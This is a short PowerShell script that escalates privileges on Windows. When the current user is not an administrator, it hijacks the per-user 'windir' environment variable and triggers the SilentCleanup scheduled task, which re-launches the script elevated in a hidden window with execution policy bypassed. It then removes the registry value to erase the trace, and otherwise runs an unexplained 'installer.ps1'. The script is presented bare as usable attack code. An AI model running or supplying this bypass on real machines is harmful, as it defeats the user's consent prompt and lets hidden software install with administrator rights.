if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
   powershell.exe -File "./installer.ps1"
} else {
   $registryPath = "HKCU:\Environment"
  
   $Name = "windir"
   $Value = "powershell -ep bypass -w h $PSCommandPath; #"
   Set-ItemProperty -Path $registryPath -Name $Name -Value $Value
   Sleep 10
   schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
   Sleep 10
   Remove-ItemProperty -Path $registryPath -Name $Name
}

